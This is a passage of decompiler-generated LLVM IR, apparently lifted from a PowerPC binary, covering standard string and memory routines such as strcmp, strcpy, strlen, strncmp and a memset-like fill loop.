  br i1 %v3_100071bc, label %dec_label_pc_100071bc.dec_label_pc_100071c4_crit_edge, label %dec_label_pc_1000720c

dec_label_pc_100071bc.dec_label_pc_100071c4_crit_edge: ; preds = %dec_label_pc_100071bc
  %v0_100071c4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100071c4

dec_label_pc_100071c4:                            ; preds = %dec_label_pc_10007224.dec_label_pc_100071c4_crit_edge, %dec_label_pc_100071bc.dec_label_pc_100071c4_crit_edge
  %v0_100071c8.pre = phi i32 [ %v0_100071bc, %dec_label_pc_100071bc.dec_label_pc_100071c4_crit_edge ], [ %v0_100071c8.pre.pre, %dec_label_pc_10007224.dec_label_pc_100071c4_crit_edge ]
  %v0_100071c4 = phi i32 [ %v0_100071c4.pre, %dec_label_pc_100071bc.dec_label_pc_100071c4_crit_edge ], [ %v1_10007224, %dec_label_pc_10007224.dec_label_pc_100071c4_crit_edge ]
  store i32 %v0_100071c4, i32* %ctr.global-to-local, align 4
  %v1_100071cc = sext i8 %v2_100071b4 to i32
  br label %dec_label_pc_100071c8

dec_label_pc_100071c8:                            ; preds = %dec_label_pc_100071c8, %dec_label_pc_100071c4
  %v0_100071c8 = phi i32 [ %v1_100071d4, %dec_label_pc_100071c8 ], [ %v0_100071c8.pre, %dec_label_pc_100071c4 ]
  %v1_100071c8 = add i32 %v0_100071c8, 4
  store i32 %v1_100071c8, i32* %r9.global-to-local, align 4
  %v4_100071cc = inttoptr i32 %v1_100071c8 to i32*
  store i32 %v1_100071cc, i32* %v4_100071cc, align 4
  %v2_100071d0 = load i32, i32* %r9.global-to-local, align 4
  %v3_100071d0 = add i32 %v2_100071d0, 4
  %v4_100071d0 = inttoptr i32 %v3_100071d0 to i32*
  store i32 %v1_100071cc, i32* %v4_100071d0, align 4
  %v0_100071d4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100071d4 = add i32 %v0_100071d4, 4
  store i32 %v1_100071d4, i32* %r11.global-to-local, align 4
  %v0_100071d8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100071d8 = add i32 %v0_100071d8, -1
  store i32 %v1_100071d8, i32* %ctr.global-to-local, align 4
  %v2_100071d8 = icmp eq i32 %v1_100071d8, 0
  br i1 %v2_100071d8, label %dec_label_pc_100071dc, label %dec_label_pc_100071c8

dec_label_pc_100071dc:                            ; preds = %dec_label_pc_100071c8, %dec_label_pc_10007224, %dec_label_pc_100071a4
  %v0_100071dc = load i32, i32* %r5.global-to-local, align 4
  %v1_100071dc = urem i32 %v0_100071dc, 8
  store i32 %v1_100071dc, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_100071dc, 4
  br i1 %tmp, label %dec_label_pc_100071f0, label %dec_label_pc_100071e8

dec_label_pc_100071e8:                            ; preds = %dec_label_pc_100071dc
  %v1_100071e8 = sext i8 %v2_100071b4 to i32
  %v2_100071e8 = load i32, i32* %r11.global-to-local, align 4
  %v3_100071e8 = add i32 %v2_100071e8, 4
  %v4_100071e8 = inttoptr i32 %v3_100071e8 to i32*
  store i32 %v1_100071e8, i32* %v4_100071e8, align 4
  store i32 %v3_100071e8, i32* %r11.global-to-local, align 4
  %v0_100071ec = load i32, i32* @r5, align 4
  %v1_100071ec = add i32 %v0_100071ec, -4
  store i32 %v1_100071ec, i32* @r5, align 4
  br label %dec_label_pc_100071f0

dec_label_pc_100071f0:                            ; preds = %dec_label_pc_100071dc, %dec_label_pc_100071e8
  %v0_100071f0 = phi i32 [ %v1_100071dc, %dec_label_pc_100071dc ], [ %v1_100071ec, %dec_label_pc_100071e8 ]
  %v3_100071f0 = icmp eq i32 %v0_100071f0, 0
  %v0_100071f4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100071f0, i32 %v0_100071f4)
  %v0_100071f8 = load i32, i32* @r5, align 4
  store i32 %v0_100071f8, i32* %ctr.global-to-local, align 4
  %v0_100071fc = load i32, i32* %r11.global-to-local, align 4
  %v1_100071fc = add i32 %v0_100071fc, 3
  store i32 %v1_100071fc, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10007200

dec_label_pc_10007200:                            ; preds = %dec_label_pc_10007200, %dec_label_pc_100071f0
  %v3_10007200 = phi i32 [ %v4_10007200, %dec_label_pc_10007200 ], [ %v1_100071fc, %dec_label_pc_100071f0 ]
  %v4_10007200 = add i32 %v3_10007200, 1
  %v5_10007200 = inttoptr i32 %v4_10007200 to i8*
  store i8 %v2_100071b4, i8* %v5_10007200, align 1
  store i32 %v4_10007200, i32* %r9.global-to-local, align 4
  %v0_10007204 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007204 = add i32 %v0_10007204, -1
  store i32 %v1_10007204, i32* %ctr.global-to-local, align 4
  %v2_10007204 = icmp eq i32 %v1_10007204, 0
  br i1 %v2_10007204, label %dec_label_pc_10007230, label %dec_label_pc_10007200

dec_label_pc_1000720c:                            ; preds = %dec_label_pc_100071bc
  %v1_1000720c = sub nsw i32 4, %v1_100071bc
  store i32 %v1_1000720c, i32* %ctr.global-to-local, align 4
  %v1_10007214 = load i32, i32* %r5.global-to-local, align 4
  %v2_10007214 = sub i32 %v1_10007214, %v1_1000720c
  store i32 %v2_10007214, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10007218

dec_label_pc_10007218:                            ; preds = %dec_label_pc_10007218, %dec_label_pc_1000720c
  %v3_10007218 = phi i32 [ %v1_1000721c, %dec_label_pc_10007218 ], [ %v0_100071bc, %dec_label_pc_1000720c ]
  %v4_10007218 = add i32 %v3_10007218, 4
  %v5_10007218 = inttoptr i32 %v4_10007218 to i8*
  store i8 %v2_100071b4, i8* %v5_10007218, align 1
  %v0_1000721c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000721c = add i32 %v0_1000721c, 1
  store i32 %v1_1000721c, i32* %r11.global-to-local, align 4
  %v0_10007220 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007220 = add i32 %v0_10007220, -1
  store i32 %v1_10007220, i32* %ctr.global-to-local, align 4
  %v2_10007220 = icmp eq i32 %v1_10007220, 0
  br i1 %v2_10007220, label %dec_label_pc_10007224, label %dec_label_pc_10007218

dec_label_pc_10007224:                            ; preds = %dec_label_pc_10007218
  %v0_10007224 = load i32, i32* %r5.global-to-local, align 4
  %v1_10007224 = call i32 @__asm_rlwinm.(i32 %v0_10007224, i32 29, i32 3, i32 31)
  store i32 %v1_10007224, i32* %r9.global-to-local, align 4
  %v4_10007224 = icmp eq i32 %v1_10007224, 0
  br i1 %v4_10007224, label %dec_label_pc_100071dc, label %dec_label_pc_10007224.dec_label_pc_100071c4_crit_edge

dec_label_pc_10007224.dec_label_pc_100071c4_crit_edge: ; preds = %dec_label_pc_10007224
  %v0_100071c8.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100071c4

dec_label_pc_10007230:                            ; preds = %dec_label_pc_10007200
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10007224, { 1, 2, 0 }
  uselistorder i32 %v1_10007220, { 1, 0 }
  uselistorder i32 %v1_1000721c, { 1, 0 }
  uselistorder i32 %v1_10007204, { 1, 0 }
  uselistorder i32 %v4_10007200, { 1, 2, 0 }
  uselistorder i32 %v1_100071dc, { 2, 1, 0 }
  uselistorder i32 %v1_100071d8, { 1, 0 }
  uselistorder i32 %v1_100071d4, { 1, 0 }
  uselistorder i32 %v1_100071bc, { 1, 0 }
  uselistorder i32 %v0_100071bc, { 2, 1, 0 }
  uselistorder i8 %v2_100071b4, { 2, 0, 3, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_100071f0, { 1, 0 }
  uselistorder label %dec_label_pc_100071dc, { 1, 0, 2 }
}

define i32 @function_10007234(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007234:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10007240.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10007238

dec_label_pc_10007238:                            ; preds = %dec_label_pc_1000725c, %dec_label_pc_10007234
  %v0_10007240 = phi i32 [ %v1_10007244, %dec_label_pc_1000725c ], [ %v0_10007240.pre, %dec_label_pc_10007234 ]
  %v0_10007238 = phi i32 [ %v1_1000723c, %dec_label_pc_1000725c ], [ %tmp, %dec_label_pc_10007234 ]
  %v1_10007238 = inttoptr i32 %v0_10007238 to i8*
  %v2_10007238 = load i8, i8* %v1_10007238, align 1
  %v3_10007238 = zext i8 %v2_10007238 to i32
  %v1_10007240 = inttoptr i32 %v0_10007240 to i8*
  %v2_10007240 = load i8, i8* %v1_10007240, align 1
  %v3_10007240 = zext i8 %v2_10007240 to i32
  %v3_10007248 = icmp eq i8 %v2_10007238, 0
  br i1 %v3_10007248, label %dec_label_pc_10007254, label %dec_label_pc_1000725c

dec_label_pc_10007254:                            ; preds = %dec_label_pc_10007238
  %v1_10007254 = sub nsw i32 0, %v3_10007240
  ret i32 %v1_10007254

dec_label_pc_1000725c:                            ; preds = %dec_label_pc_10007238
  %v4_1000724c = icmp eq i8 %v2_10007238, %v2_10007240
  %v1_10007244 = add i32 %v0_10007240, 1
  %v1_1000723c = add i32 %v0_10007238, 1
  br i1 %v4_1000724c, label %dec_label_pc_10007238, label %dec_label_pc_10007260

dec_label_pc_10007260:                            ; preds = %dec_label_pc_1000725c
  %v2_10007260 = sub nsw i32 %v3_10007238, %v3_10007240
  ret i32 %v2_10007260

; uselistorder directives
  uselistorder i32 %v3_10007240, { 1, 0 }
  uselistorder i32 %v0_10007238, { 1, 0 }
  uselistorder i32 %v0_10007240, { 1, 0 }
}

define i32 @function_10007268(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_10007268:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_10007268 = add i32 %arg1, -1
  %v1_1000726c = sub i32 %v2_10007268, %tmp
  store i32 %v1_1000726c, i32* %r9.global-to-local, align 4
  %v2_100072704 = load i8, i8* %arg2, align 1
  %v1_100072746 = add i32 %tmp, 1
  store i32 %v1_100072746, i32* %r4.global-to-local, align 4
  %v3_100072788 = icmp eq i8 %v2_100072704, 0
  store i1 %v3_100072788, i1* %cr7_eq.global-to-local, align 1
  %v5_1000727c9 = inttoptr i32 %arg1 to i8*
  store i8 %v2_100072704, i8* %v5_1000727c9, align 1
  %v0_1000728010 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000728010, label %dec_label_pc_10007284, label %dec_label_pc_10007270.dec_label_pc_10007270_crit_edge

dec_label_pc_10007270.dec_label_pc_10007270_crit_edge: ; preds = %dec_label_pc_10007268, %dec_label_pc_10007270.dec_label_pc_10007270_crit_edge
  %v0_10007270.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_1000727c.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10007270 = inttoptr i32 %v0_10007270.pre to i8*
  %v2_10007270 = load i8, i8* %v1_10007270, align 1
  %v1_10007274 = add i32 %v0_10007270.pre, 1
  store i32 %v1_10007274, i32* %r4.global-to-local, align 4
  %v3_10007278 = icmp eq i8 %v2_10007270, 0
  store i1 %v3_10007278, i1* %cr7_eq.global-to-local, align 1
  %v4_1000727c = add i32 %v1_10007274, %v2_1000727c.pre
  %v5_1000727c = inttoptr i32 %v4_1000727c to i8*
  store i8 %v2_10007270, i8* %v5_1000727c, align 1
  %v0_10007280 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007280, label %dec_label_pc_10007284, label %dec_label_pc_10007270.dec_label_pc_10007270_crit_edge

dec_label_pc_10007284:                            ; preds = %dec_label_pc_10007270.dec_label_pc_10007270_crit_edge, %dec_label_pc_10007268
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007270.dec_label_pc_10007270_crit_edge, { 1, 0 }
}

define i32 @function_10007288() local_unnamed_addr {
dec_label_pc_10007288:
  %v0_10007288 = load i32, i32* @r3, align 4
  %v1_100072a03 = urem i32 %v0_10007288, 4
  %v3_100072a05 = icmp eq i32 %v1_100072a03, 0
  br i1 %v3_100072a05, label %dec_label_pc_100072a8, label %dec_label_pc_10007290

dec_label_pc_10007290:                            ; preds = %dec_label_pc_10007288, %dec_label_pc_1000729c
  %v0_1000729c = phi i32 [ %v1_1000729c, %dec_label_pc_1000729c ], [ %v0_10007288, %dec_label_pc_10007288 ]
  %v1_10007290 = inttoptr i32 %v0_1000729c to i8*
  %v2_10007290 = load i8, i8* %v1_10007290, align 1
  %v3_10007294 = icmp eq i8 %v2_10007290, 0
  br i1 %v3_10007294, label %dec_label_pc_100072dc, label %dec_label_pc_1000729c

dec_label_pc_1000729c:                            ; preds = %dec_label_pc_10007290
  %v1_1000729c = add i32 %v0_1000729c, 1
  %v1_100072a0 = urem i32 %v1_1000729c, 4
  %v3_100072a0 = icmp eq i32 %v1_100072a0, 0
  br i1 %v3_100072a0, label %dec_label_pc_100072a8, label %dec_label_pc_10007290

dec_label_pc_100072a8:                            ; preds = %dec_label_pc_1000729c, %dec_label_pc_10007288
  %v0_100072ac = phi i32 [ %v0_10007288, %dec_label_pc_10007288 ], [ %v1_1000729c, %dec_label_pc_1000729c ]
  br label %dec_label_pc_100072b4

dec_label_pc_100072b4:                            ; preds = %dec_label_pc_10007314, %dec_label_pc_100072b4, %dec_label_pc_100072a8
  %v1_100072f0 = phi i32 [ %v0_100072ac, %dec_label_pc_100072a8 ], [ %v1_100072b8, %dec_label_pc_100072b4 ], [ %v1_100072b8, %dec_label_pc_10007314 ]
  %v1_100072b4 = inttoptr i32 %v1_100072f0 to i32*
  %v2_100072b4 = load i32, i32* %v1_100072b4, align 4
  %v1_100072b8 = add i32 %v1_100072f0, 4
  %v1_100072c4 = add i32 %v2_100072b4, -16843009
  %v2_100072c8 = and i32 %v1_100072c4, -2139062144
  %v5_100072c8 = icmp eq i32 %v2_100072c8, 0
  br i1 %v5_100072c8, label %dec_label_pc_100072b4, label %dec_label_pc_100072d0

dec_label_pc_100072d0:                            ; preds = %dec_label_pc_100072b4
  %v2_100072d0 = inttoptr i32 %v1_100072f0 to i8*
  %v3_100072d0 = load i8, i8* %v2_100072d0, align 1
  %v3_100072d4 = icmp eq i8 %v3_100072d0, 0
  br i1 %v3_100072d4, label %dec_label_pc_100072dc, label %dec_label_pc_100072e4

dec_label_pc_100072dc:                            ; preds = %dec_label_pc_10007290, %dec_label_pc_100072d0
  %v1_100072dc = phi i32 [ %v1_100072f0, %dec_label_pc_100072d0 ], [ %v0_1000729c, %dec_label_pc_10007290 ]
  %v2_100072dc = sub i32 %v1_100072dc, %v0_10007288
  ret i32 %v2_100072dc

dec_label_pc_100072e4:                            ; preds = %dec_label_pc_100072d0
  %v1_100072e4 = add i32 %v1_100072f0, 1
  %v2_100072e4 = inttoptr i32 %v1_100072e4 to i8*
  %v3_100072e4 = load i8, i8* %v2_100072e4, align 1
  %v3_100072e8 = icmp eq i8 %v3_100072e4, 0
  br i1 %v3_100072e8, label %dec_label_pc_100072f0, label %dec_label_pc_100072fc

dec_label_pc_100072f0:                            ; preds = %dec_label_pc_100072e4
  %v2_100072f0 = sub i32 %v1_100072f0, %v0_10007288
  %v1_100072f4 = add i32 %v2_100072f0, 1
  ret i32 %v1_100072f4

dec_label_pc_100072fc:                            ; preds = %dec_label_pc_100072e4
  %v1_100072fc = add i32 %v1_100072f0, 2
  %v2_100072fc = inttoptr i32 %v1_100072fc to i8*
  %v3_100072fc = load i8, i8* %v2_100072fc, align 1
  %v3_10007300 = icmp eq i8 %v3_100072fc, 0
  br i1 %v3_10007300, label %dec_label_pc_10007308, label %dec_label_pc_10007314

dec_label_pc_10007308:                            ; preds = %dec_label_pc_100072fc
  %v2_10007308 = sub i32 %v1_100072f0, %v0_10007288
  %v1_1000730c = add i32 %v2_10007308, 2
  ret i32 %v1_1000730c

dec_label_pc_10007314:                            ; preds = %dec_label_pc_100072fc
  %v1_10007314 = add i32 %v1_100072f0, 3
  %v2_10007314 = inttoptr i32 %v1_10007314 to i8*
  %v3_10007314 = load i8, i8* %v2_10007314, align 1
  %v3_10007318 = icmp eq i8 %v3_10007314, 0
  br i1 %v3_10007318, label %dec_label_pc_10007320, label %dec_label_pc_100072b4

dec_label_pc_10007320:                            ; preds = %dec_label_pc_10007314
  %v2_10007320 = sub i32 %v1_100072f0, %v0_10007288
  %v1_10007324 = add i32 %v2_10007320, 3
  ret i32 %v1_10007324

; uselistorder directives
  uselistorder i32 %v1_100072b8, { 1, 0 }
  uselistorder i32 %v1_100072f0, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_1000729c, { 1, 0, 2 }
  uselistorder i32 %v0_10007288, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_100072dc, { 1, 0 }
  uselistorder label %dec_label_pc_10007290, { 1, 0 }
}

define i32 @function_1000732c(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000732c:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp21 = icmp ult i32 %arg2, 4
  br i1 %tmp21, label %dec_label_pc_10007404, label %dec_label_pc_10007340

dec_label_pc_10007340:                            ; preds = %dec_label_pc_1000732c
  %v1_10007340 = udiv i32 %arg2, 4
  %v0_10007350.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10007348

dec_label_pc_10007348:                            ; preds = %dec_label_pc_100073d0, %dec_label_pc_10007340
  %v0_100073d0 = phi i32 [ %v1_100073d0, %dec_label_pc_100073d0 ], [ %v1_10007340, %dec_label_pc_10007340 ]
  %v0_10007370 = phi i32 [ %v1_10007388, %dec_label_pc_100073d0 ], [ %v0_10007350.pre, %dec_label_pc_10007340 ]
  %v0_10007368 = phi i32 [ %v1_10007384, %dec_label_pc_100073d0 ], [ %tmp, %dec_label_pc_10007340 ]
  %v1_10007348 = inttoptr i32 %v0_10007368 to i8*
  %v2_10007348 = load i8, i8* %v1_10007348, align 1
  %v1_10007350 = inttoptr i32 %v0_10007370 to i8*
  %v2_10007350 = load i8, i8* %v1_10007350, align 1
  %v3_10007358 = icmp eq i8 %v2_10007348, 0
  %v4_1000735c.not = icmp ne i8 %v2_10007348, %v2_10007350
  %brmerge = or i1 %v3_10007358, %v4_1000735c.not
  br i1 %brmerge, label %dec_label_pc_100073b0, label %dec_label_pc_10007368

dec_label_pc_10007368:                            ; preds = %dec_label_pc_10007348
  %v1_10007354 = add i32 %v0_10007370, 1
  %v1_1000734c = add i32 %v0_10007368, 1
  %v2_10007368 = inttoptr i32 %v1_1000734c to i8*
  %v3_10007368 = load i8, i8* %v2_10007368, align 1
  %v2_10007370 = inttoptr i32 %v1_10007354 to i8*
  %v3_10007370 = load i8, i8* %v2_10007370, align 1
  %v3_10007378 = icmp eq i8 %v3_10007368, 0
  %v1_1000737c = add i32 %v0_10007368, 3
  %v1_10007380 = add i32 %v0_10007370, 3
  %v1_10007384 = add i32 %v0_10007368, 4
  %v1_10007388 = add i32 %v0_10007370, 4
  store i32 %v1_10007388, i32* @r4, align 4
  %v4_1000738c.not = icmp ne i8 %v3_10007368, %v3_10007370
  %brmerge1 = or i1 %v3_10007378, %v4_1000738c.not
  br i1 %brmerge1, label %dec_label_pc_100073b0, label %dec_label_pc_10007398

dec_label_pc_10007398:                            ; preds = %dec_label_pc_10007368
  %v1_10007374 = add i32 %v0_10007370, 2
  %v1_1000736c = add i32 %v0_10007368, 2
  %v2_10007398 = inttoptr i32 %v1_1000736c to i8*
  %v3_10007398 = load i8, i8* %v2_10007398, align 1
  %v2_1000739c = inttoptr i32 %v1_10007374 to i8*
  %v3_1000739c = load i8, i8* %v2_1000739c, align 1
  %v3_100073a0 = icmp eq i8 %v3_10007398, 0
  %v4_100073a4.not = icmp ne i8 %v3_10007398, %v3_1000739c
  %brmerge2 = or i1 %v3_100073a0, %v4_100073a4.not
  br i1 %brmerge2, label %dec_label_pc_100073b0, label %dec_label_pc_100073b8

dec_label_pc_100073b0:                            ; preds = %dec_label_pc_10007398, %dec_label_pc_10007368, %dec_label_pc_10007348
  %v1_100073b0.in = phi i8 [ %v3_10007398, %dec_label_pc_10007398 ], [ %v3_10007368, %dec_label_pc_10007368 ], [ %v2_10007348, %dec_label_pc_10007348 ]
  %v0_100073b0.in = phi i8 [ %v3_1000739c, %dec_label_pc_10007398 ], [ %v3_10007370, %dec_label_pc_10007368 ], [ %v2_10007350, %dec_label_pc_10007348 ]
  %v0_100073b0 = zext i8 %v0_100073b0.in to i32
  %v1_100073b0 = zext i8 %v1_100073b0.in to i32
  %v2_100073b0 = sub nsw i32 %v1_100073b0, %v0_100073b0
  ret i32 %v2_100073b0

dec_label_pc_100073b8:                            ; preds = %dec_label_pc_10007398
  %v2_100073b8 = inttoptr i32 %v1_1000737c to i8*
  %v3_100073b8 = load i8, i8* %v2_100073b8, align 1
  %v4_100073b8 = zext i8 %v3_100073b8 to i32
  %v2_100073bc = inttoptr i32 %v1_10007380 to i8*
  %v3_100073bc = load i8, i8* %v2_100073bc, align 1
  %v4_100073bc = zext i8 %v3_100073bc to i32
  %v3_100073c0 = icmp eq i8 %v3_100073b8, 0
  %v4_100073c4.not = icmp ne i8 %v3_100073b8, %v3_100073bc
  %brmerge3 = or i1 %v3_100073c0, %v4_100073c4.not
  br i1 %brmerge3, label %dec_label_pc_100073fc, label %dec_label_pc_100073d0

dec_label_pc_100073d0:                            ; preds = %dec_label_pc_100073b8
  %v1_100073d0 = add i32 %v0_100073d0, -1
  %v2_100073d0 = icmp eq i32 %v1_100073d0, 0
  br i1 %v2_100073d0, label %dec_label_pc_100073d4, label %dec_label_pc_10007348

dec_label_pc_100073d4:                            ; preds = %dec_label_pc_100073d0
  %v1_100073d4 = urem i32 %arg2, 4
  br label %dec_label_pc_10007404

dec_label_pc_100073dc:                            ; preds = %dec_label_pc_1000740c
  %v1_100073dc = inttoptr i32 %v0_100073dc to i8*
  %v2_100073dc = load i8, i8* %v1_100073dc, align 1
  %v3_100073dc = zext i8 %v2_100073dc to i32
  %v1_100073e0 = add i32 %v0_100073dc, 1
  %v0_100073e4 = load i32, i32* @r4, align 4
  %v1_100073e4 = inttoptr i32 %v0_100073e4 to i8*
  %v2_100073e4 = load i8, i8* %v1_100073e4, align 1
  %v3_100073e4 = zext i8 %v2_100073e4 to i32
  %v1_100073e8 = add i32 %v0_100073e4, 1
  store i32 %v1_100073e8, i32* @r4, align 4
  %v3_100073ec = icmp eq i8 %v2_100073dc, 0
  %v4_100073f0.not = icmp ne i8 %v2_100073dc, %v2_100073e4
  %brmerge4 = or i1 %v3_100073ec, %v4_100073f0.not
  br i1 %brmerge4, label %dec_label_pc_100073fc, label %dec_label_pc_1000740c

dec_label_pc_100073fc:                            ; preds = %dec_label_pc_100073b8, %dec_label_pc_100073dc
  %v1_100073fc = phi i32 [ %v3_100073dc, %dec_label_pc_100073dc ], [ %v4_100073b8, %dec_label_pc_100073b8 ]
  %v0_100073fc = phi i32 [ %v3_100073e4, %dec_label_pc_100073dc ], [ %v4_100073bc, %dec_label_pc_100073b8 ]
  %v2_100073fc = sub nsw i32 %v1_100073fc, %v0_100073fc
  ret i32 %v2_100073fc

dec_label_pc_10007404:                            ; preds = %dec_label_pc_1000732c, %dec_label_pc_100073d4
  %v1_1000741020 = phi i32 [ 0, %dec_label_pc_1000732c ], [ %v4_100073b8, %dec_label_pc_100073d4 ]
  %v0_1000741018 = phi i32 [ 0, %dec_label_pc_1000732c ], [ %v4_100073bc, %dec_label_pc_100073d4 ]
  %v0_100073dc14 = phi i32 [ %tmp, %dec_label_pc_1000732c ], [ %v1_10007384, %dec_label_pc_100073d4 ]
  %v0_10007404 = phi i32 [ %arg2, %dec_label_pc_1000732c ], [ %v1_100073d4, %dec_label_pc_100073d4 ]
  %v1_10007404 = add i32 %v0_10007404, 1
  br label %dec_label_pc_1000740c

dec_label_pc_1000740c:                            ; preds = %dec_label_pc_100073dc, %dec_label_pc_10007404
  %v1_10007410 = phi i32 [ %v3_100073dc, %dec_label_pc_100073dc ], [ %v1_1000741020, %dec_label_pc_10007404 ]
  %v0_10007410 = phi i32 [ %v3_100073e4, %dec_label_pc_100073dc ], [ %v0_1000741018, %dec_label_pc_10007404 ]
  %v0_100073dc = phi i32 [ %v1_100073e0, %dec_label_pc_100073dc ], [ %v0_100073dc14, %dec_label_pc_10007404 ]
  %v0_1000740c = phi i32 [ %v1_1000740c, %dec_label_pc_100073dc ], [ %v1_10007404, %dec_label_pc_10007404 ]
  %v1_1000740c = add i32 %v0_1000740c, -1
  %v2_1000740c = icmp eq i32 %v1_1000740c, 0
  br i1 %v2_1000740c, label %dec_label_pc_10007410, label %dec_label_pc_100073dc

dec_label_pc_10007410:                            ; preds = %dec_label_pc_1000740c
  %v2_10007410 = sub nsw i32 %v1_10007410, %v0_10007410
  ret i32 %v2_10007410

; uselistorder directives
  uselistorder i32 %v1_1000740c, { 1, 0 }
  uselistorder i32 %v3_100073e4, { 1, 0 }
  uselistorder i32 %v3_100073dc, { 1, 0 }
  uselistorder i32 %v1_100073d0, { 1, 0 }
  uselistorder i32 %v4_100073bc, { 1, 0 }
  uselistorder i32 %v4_100073b8, { 1, 0 }
  uselistorder i32 %v1_10007388, { 1, 0 }
  uselistorder i32 %v0_10007368, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_10007370, { 2, 0, 1, 4, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000740c, { 1, 0 }
  uselistorder label %dec_label_pc_10007404, { 1, 0 }
  uselistorder label %dec_label_pc_100073fc, { 1, 0 }
}

define i32 @function_10007418(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007418:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_10007418 = icmp eq i32 %arg2, 3
  store i1 %v3_10007418, i1* %cr7_eq.global-to-local, align 1
  %v1_1000741c = add i32 %arg1, -1
  store i32 %v1_1000741c, i32* %r11.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_10007498, label %dec_label_pc_10007424

dec_label_pc_10007424:                            ; preds = %dec_label_pc_10007418
  %v1_10007424 = udiv i32 %arg2, 4
  store i32 %v1_10007424, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000742c

dec_label_pc_1000742c:                            ; preds = %dec_label_pc_1000747c, %dec_label_pc_10007424
  %v2_1000743c = phi i32 [ %v3_10007474, %dec_label_pc_1000747c ], [ %v1_1000741c, %dec_label_pc_10007424 ]
  %v0_1000742c = load i32, i32* @r4, align 4
  %v1_1000742c = inttoptr i32 %v0_1000742c to i8*
  %v2_1000742c = load i8, i8* %v1_1000742c, align 1
  %v1_10007430 = add i32 %v0_1000742c, 1
  store i32 %v1_10007430, i32* %r10.global-to-local, align 4
  %v1_10007434 = add i32 %v0_1000742c, 2
  store i32 %v1_10007434, i32* %r8.global-to-local, align 4
  %v3_10007438 = icmp eq i8 %v2_1000742c, 0
  store i1 %v3_10007438, i1* %cr7_eq.global-to-local, align 1
  %v3_1000743c = add i32 %v2_1000743c, 1
  %v4_1000743c = inttoptr i32 %v3_1000743c to i8*
  store i8 %v2_1000742c, i8* %v4_1000743c, align 1
  store i32 %v3_1000743c, i32* %r11.global-to-local, align 4
  %v0_10007440 = load i32, i32* %r8.global-to-local, align 4
  %v1_10007440 = add i32 %v0_10007440, 1
  store i32 %v1_10007440, i32* %r9.global-to-local, align 4
  %v0_10007444 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007444, label %dec_label_pc_10007484, label %dec_label_pc_10007448

dec_label_pc_10007448:                            ; preds = %dec_label_pc_1000742c
  %v0_10007448 = load i32, i32* @r4, align 4
  %v1_10007448 = add i32 %v0_10007448, 1
  %v2_10007448 = inttoptr i32 %v1_10007448 to i8*
  %v3_10007448 = load i8, i8* %v2_10007448, align 1
  %v1_1000744c = add i32 %v0_10007440, 2
  store i32 %v1_1000744c, i32* @r4, align 4
  %v3_10007450 = icmp eq i8 %v3_10007448, 0
  store i1 %v3_10007450, i1* %cr7_eq.global-to-local, align 1
  %v3_10007454 = add i32 %v2_1000743c, 2
  %v4_10007454 = inttoptr i32 %v3_10007454 to i8*
  store i8 %v3_10007448, i8* %v4_10007454, align 1
  store i32 %v3_10007454, i32* %r11.global-to-local, align 4
  %v0_10007458 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007458, label %dec_label_pc_10007484, label %dec_label_pc_1000745c

dec_label_pc_1000745c:                            ; preds = %dec_label_pc_10007448
  %v0_1000745c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000745c = add i32 %v0_1000745c, 1
  %v2_1000745c = inttoptr i32 %v1_1000745c to i8*
  %v3_1000745c = load i8, i8* %v2_1000745c, align 1
